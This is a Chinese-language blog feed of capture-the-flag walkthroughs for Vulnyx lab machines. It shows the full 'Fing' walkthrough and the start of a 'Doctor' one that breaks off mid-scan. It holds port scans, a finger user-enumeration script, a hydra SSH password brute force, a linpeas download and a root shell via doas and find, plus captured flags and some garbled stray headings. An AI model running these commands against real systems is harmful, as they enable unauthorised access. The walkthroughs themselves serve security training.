class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/fing]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,79,80 192.168.2.45<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-04 16:09 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.45<br>Host is up (0.00095s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)<br>|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)<br>|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)<br>79/tcp open  finger  Linux fingerd<br>|_finger: No one logged on.\x0D<br>80/tcp open  http    Apache httpd 2.4.56 ((Debian))<br>|_http-title: Apache2 Debian Default Page: It works<br>|_http-server-header: Apache/2.4.56 (Debian)<br>MAC Address: 08:00:27:DF:B9:AC (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 19.55 seconds<br></code></pre></td></tr></table></figure><p><code>79端口</code>：开放的服务是<code>finger</code>，并提示<code>No one logged on</code>，当前没有用户登录<br><code>80端口</code>：Apache2 Debian的默认页面</p><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/fing]<br>└─# nmap -sU --top-ports 100 192.168.2.45                       <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-04 16:10 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.45<br>Host is up (0.00083s latency).<br>All 100 scanned ports on 192.168.2.45 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 57 closed udp ports (port-unreach), 43 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:DF:B9:AC (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 54.77 seconds<br></code></pre></td></tr></table></figure><p>没有开放的UDP端口</p><h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p>访问80端口，是一个Apache Debian的默认页面，没啥东西<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507041721621.png"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>尝试进行目录扫描，也没有发现任何东西，转<code>79</code>端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/fing]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.45 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.45<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              bak,php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 10701]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><h2 id="2、79端口"><a href="#2、79端口" class="headerlink" title="2、79端口"></a>2、79端口</h2><p>根据<code>nmap</code>扫描出来的结果，发现<code>79</code>端口运行的服务是<code>finger</code></p><p><code>curl</code>发现不允许</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/fing]<br>└─# curl http://192.168.2.45:79<br>curl: (1) Received HTTP/0.9 when not allowed<br></code></pre></td></tr></table></figure><h3 id="xxxxxxxxxx2-1gift-cat-root-txt-2HMVtyr543FGbash"><a href="#xxxxxxxxxx2-1gift-cat-root-txt-2HMVtyr543FGbash" class="headerlink" title="xxxxxxxxxx2 1gift:~# cat root.txt 2HMVtyr543FGbash"></a>xxxxxxxxxx2 1gift:~# cat root.txt 2HMVtyr543FGbash</h3><p>查看一下<code>finger</code>命令的使用，发现可以访问远程主机的用户信息</p><ul><li><p>如果用户存在，则会反馈具体的信息<code>Login:...</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/fing]<br>└─# finger root@192.168.2.45       <br>Login: root                             Name: root<br>Directory: /root                        Shell: /bin/bash<br>Last login Fri Jul 14 17:02 2023 (CEST) on tty1<br>No mail.<br>No Plan.<br></code></pre></td></tr></table></figure></li><li><p>如果用户不存在，则反馈<code>no such user</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/fing]<br>└─# finger admin@192.168.2.45<br>finger: admin: no such user.<br></code></pre></td></tr></table></figure></li></ul><p>尝试写个脚本，爆破一下存在的用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># 目标主机配置</span><br>TARGET_HOST=<span class="hljs-string">&quot;192.168.2.45&quot;</span><br>USER_FILE=<span class="hljs-string">&quot;./username.txt&quot;</span><br><br><span class="hljs-comment"># 清空旧日志（改为终端提示）</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[!] 开始扫描: <span class="hljs-variable">$TARGET_HOST</span> | 用户字典: <span class="hljs-subst">$(wc -l &lt; <span class="hljs-string">&quot;<span class="hljs-variable">$USER_FILE</span>&quot;</span>)</span> 个&quot;</span><br><br><span class="hljs-comment"># 用户爆破核心逻辑</span><br><span class="hljs-keyword">while</span> IFS= <span class="hljs-built_in">read</span> -r user; <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;正在检测: <span class="hljs-variable">$user</span> → &quot;</span><br>    <br>    <span class="hljs-comment"># 执行finger命令并捕获输出</span><br>    output=$(finger -m <span class="hljs-string">&quot;<span class="hljs-variable">$user</span>@<span class="hljs-variable">$TARGET_HOST</span>&quot;</span> 2&gt;&amp;1)<br>    <br>    <span class="hljs-comment"># 判断结果有效性</span><br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$output</span> = *<span class="hljs-string">&quot;Login&quot;</span>* ]]; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[32m[+] 发现有效用户\033[0m&quot;</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;详情: <span class="hljs-variable">$output</span>&quot;</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[31m[-] 用户不存在\033[0m&quot;</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span> &lt; <span class="hljs-string">&quot;<span class="hljs-variable">$USER_FILE</span>&quot;</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[!] 扫描完成&quot;</span><br></code></pre></td></tr></table></figure><p>经过爆破，发现<code>/home</code>目录下面存在一个用户<code>adam</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/fing]<br>└─# ./finger.sh <br>[!] 开始扫描: 192.168.2.45 | 用户字典: 1000 个<br>..........<br>正在检测: tigger → [-] 用户不存在<br>正在检测: chicken → [-] 用户不存在<br>正在检测: adam → [+] 发现有效用户<br>详情: Login: adam                               Name: adam<br>Directory: /home/adam                   Shell: /bin/bash<br>Last login Sun Apr 23 13:21 2023 (CEST) on pts/0 from 192.168.1.10<br>No mail.<br>No Plan.<br>..........<br></code></pre></td></tr></table></figure><h1 id="四、SSH密码爆破"><a href="#四、SSH密码爆破" class="headerlink" title="四、SSH密码爆破"></a>四、SSH密码爆破</h1><p>尝试去登录，发现需要密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/fing]<br>└─# ssh adam@192.168.2.45           <br>The authenticity of host <span class="hljs-string">&#x27;192.168.2.45 (192.168.2.45)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.2.45<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">adam@192.168.2.45&#x27;</span>s password: <br>Permission denied, please try again.<br></code></pre></td></tr></table></figure><p>使用<code>hydra</code>爆破密码，找到密码<code>passion</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/fing]<br>└─# hydra -t 64 -l adam -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt ssh://192.168.2.45 -F -I<br>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-04 17:43:28<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore<br>[DATA] max 64 tasks per 1 server, overall 64 tasks, 1000 login tries (l:1/p:1000), ~16 tries per task<br>[DATA] attacking ssh://192.168.2.45:22/<br>[STATUS] 536.00 tries/min, 536 tries <span class="hljs-keyword">in</span> 00:01h, 502 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:01h, 26 active<br>[22][ssh] host: 192.168.2.45   login: adam   password: passion<br>[STATUS] attack finished <span class="hljs-keyword">for</span> 192.168.2.45 (valid pair found)<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-04 17:45:05<br></code></pre></td></tr></table></figure><h1 id="五、获取user权限"><a href="#五、获取user权限" class="headerlink" title="五、获取user权限"></a>五、获取user权限</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/fing]<br>└─# ssh adam@192.168.2.45           <br>adam@192.168.2.45<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux fing 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64</span><br><span class="hljs-string">Last login: Sun Apr 23 13:21:44 2023 from 192.168.1.10</span><br><span class="hljs-string">adam@fing:~$ id</span><br><span class="hljs-string">uid=1000(adam) gid=1000(adam) grupos=1000(adam)</span><br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">adam@fing:~$ <span class="hljs-built_in">cat</span> user.txt <br>ff18a9aca2d1dac41a5c26e6667bea9d<br></code></pre></td></tr></table></figure><h1 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h1><p>xxxxxxxxxx3 1# cat &#x2F;home&#x2F;dragon&#x2F;user.txt &#x2F;root&#x2F;root.txt2e1f9c2e8a1d8477f9b3f6cd298f9f3bd37a4d1b35eebf4aefa5f1b0198b0d6c17bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">adam@fing:/$ <span class="hljs-built_in">sudo</span> -l<br>-bash: <span class="hljs-built_in">sudo</span>: orden no encontrada<br></code></pre></td></tr></table></figure><h2 id="linpeas扫描"><a href="#linpeas扫描" class="headerlink" title="linpeas扫描"></a>linpeas扫描</h2><p>翻了好久没找到啥思路，直接使用提权脚本<code>linpeas.sh</code>跑一遍</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">adam@fing:/tmp$ wget http://192.168.2.4/linpeas.sh<br>--2025-07-04 12:14:52--  http://192.168.2.4/linpeas.sh<br>Conectando con 192.168.2.4:80... conectado.<br>Petición HTTP enviada, esperando respuesta... 200 OK<br>Longitud: 847920 (828K) [text/x-sh]<br>Grabando a: «linpeas.sh.1»<br><br>linpeas.sh.1                        100%[==================================================================&gt;] 828,05K  --.-KB/s    en 0,01s   <br><br>2025-07-04 12:14:52 (57,0 MB/s) - «linpeas.sh.1» guardado [847920/847920]<br>adam@fing:/tmp$ <span class="hljs-built_in">chmod</span> +x linpeas.sh<br>adam@fing:/tmp$ ./linpeas.sh <br></code></pre></td></tr></table></figure><p>最后在跑完的结果里面，找到一个关键信息<code>doas</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">╔══════════╣ Checking doas.conf<br>permit nopass keepenv adam as root cmd /usr/bin/find<br></code></pre></td></tr></table></figure><p>允许当前用户<code>adam</code>以<code>root</code>的权限执行<code>/usr/bin/find</code></p><h2 id="doas-find提权"><a href="#doas-find提权" class="headerlink" title="doas-find提权"></a>doas-find提权</h2><p>参考<code>https://gtfobins.github.io/gtfobins/find/</code>，直接进行提权即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">adam@fing:/$ doas /usr/bin/find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) grupos=0(root)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat /root/root.txt</span><br>1edf2dfe68c6745e93affa42be9a80ce<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、Finger"><a href="#1、Finger" class="headerlink" title="1、Finger"></a>1、Finger</h2><p><code>finger</code>命令是一个<code>用户信息</code>查找程序，它可以显示系统用户的信息。<br>查询远程机上的用户信息，需要在用户名后面接<code>@主机名</code>，采用<code>用户名@主机名</code>的格式，不过要<code>查询的网络主机需要运行finger守护进程</code>的支持。</p><ul><li>显示所有已登录用户的信息 <code>finger</code></li><li>显示特定用户的信息 <code>finger username</code></li><li>显示所有用户的详细信息 <code>finger -l </code></li><li>显示所有用户的简短信息 <code>finger -s</code></li></ul><h2 id="2、doas"><a href="#2、doas" class="headerlink" title="2、doas"></a>2、doas</h2><p><code>OpenDoas</code>是<code>OpenBSD doas </code>命令的可移植版本，其大小比sudo更小。与sudo类似，doas也用于在系统上以其他用户的身份运行。</p><p>要使用<code>doas</code>，只需在命令及其参数前加上<code>doas</code>和<code>空格</code>：</p><p>以其他用户身份进入交互式 shell（<code>省略将默认为root</code>）： <code>-u user</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">doas -u username<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vulnyx</category>
      
    </categories>
    
    
    <tags>
      
      <tag>finger</tag>
      
      <tag>sudo-doas</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Doctor</title>
    <link href="/Vulnyx/Doctor/"/>
    <url>/Vulnyx/Doctor/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://vulnyx.com/file/Doctor.php">https://vulnyx.com/file/Doctor.php</a></p><h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/doctor]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 14:28 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00062s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00066s latency).<br>MAC Address: 08:00:27:02:D6:DC (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.44<br>Host is up (0.00089s latency).<br>MAC Address: 08:00:27:F9:ED:72 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.13 seconds<br></code></pre></td></tr></table></figure><p>IP地址：<code>192.168.2.44</code></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/doctor]<br>└─# nmap --min-rate 10000 -p- 192.168.2.44                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 14:28 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.44<br>Host is up (0.00018s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:F9:ED:72 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.56 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22和80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/doctor]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.44<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 14:29 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.44<br>Host is up (0.0010s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)<br>|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)<br>|_  256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.38 ((Debian))<br>|_http-title: Docmed<br>|_http-server-header: Apache/2.4.38 (Debian)<br>MAC Address: 08:00:27:F9:ED:72 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.99 seconds<br></code></pre></td></tr></table></figure><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/doctor]<br>└─# nmap -sU --top-ports 100 192.168.2.44                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 14:30 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.44<br>Host is up (0.00097s latency).<br>All 100 scanned ports on 192.168.2.44 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 61 closed udp ports (port-unreach), 39 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:F9:ED:72 (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure><p>没有端口开放</p><h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><p>访问80端口，发现该系统模板是<code>Colorlib</code>，同时找到一个域名<code>contact.com</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507031438445.png"><br>追加域名到<code>hosts</code>文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/doctor]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;192.168.2.44 contact.com&quot;</span> &gt;&gt; /etc/hosts<br></code></pre></td></tr></table></figure><h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/doctor]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.44 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.44<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              bak,php,txt,html<br>[+] Timeout:                 